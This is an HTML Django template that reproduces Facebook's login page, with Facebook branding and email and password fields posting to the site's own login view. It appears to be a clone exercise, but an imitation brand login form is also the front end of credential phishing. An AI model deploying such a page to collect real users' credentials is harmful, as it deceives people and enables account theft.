<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        /* General Styles */
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            height: 100%;
        }

        /* Login Box */
        .login-box {
            background-color: white;
            padding: 30px;
            width: 400px;
            box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            text-align: center;
        }

        /* Facebook Title */
        .facebook-title {
            color: #1877f2;
            font-size: 48px;
            font-weight: bold;
            margin-bottom: 20px;
            font-family: 'Helvetica', sans-serif;
        }

        /* Login Title */
        .login-title {
            font-size: 20px;
            color: #606770;
            margin-bottom: 20px;
        }

        /* Input Fields */
        .input-field {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
        }

        /* Login Button */
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-btn:hover {
            background-color: #1659b7;
        }

        /* Forgot and Sign Up Links */
        .forgot-link {
            display: block;
            margin-top: 10px;
            font-size: 14px;
            color: #1877f2;
            text-decoration: none;
        }

        .signup-link {
            font-size: 14px;
            color: #1877f2;
        }

        .signup-link a {
            color: #1877f2;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <h1 class="facebook-title">facebook</h1>
            <h2 class="login-title">Log Into Facebook</h2>
            <form action="{% url 'login' %}" method="POST">
                {% csrf_token %}
                <input type="text" placeholder="Email or phone number" class="input-field" name="username" required>
                <input type="password" placeholder="Password" class="input-field" name="password" required>
                <button type="submit" class="login-btn">Log In</button>
                <a href="#" class="forgot-link">Forgot account?</a> 
                <span class="signup-link"> Â· <a href="#">Sign up for Facebook</a></span>
            </form>
        </div>
    </div>
</body>
</html>
